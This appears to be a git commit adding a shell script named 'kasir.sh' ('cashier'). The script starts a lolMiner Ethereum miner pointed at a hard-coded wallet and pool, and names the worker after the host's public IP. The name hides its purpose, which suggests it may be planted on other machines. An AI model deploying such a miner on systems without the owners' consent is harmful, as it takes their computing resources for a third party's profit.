e587002b298f15605d97a9dccd2c2119266e051f
brendi <arisirsandi@gmail.com>
2021-02-13 09:55:32 +0700

    Add files via upload

---
+++ kasir.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=asia1.ethermine.org:14444
+WALLET=0x411e198601fd8d9293697c7584435ecea20209f4
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-kasir
+
+cd "$(dirname "$0")"
+
+chmod +x ./lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 0 $@
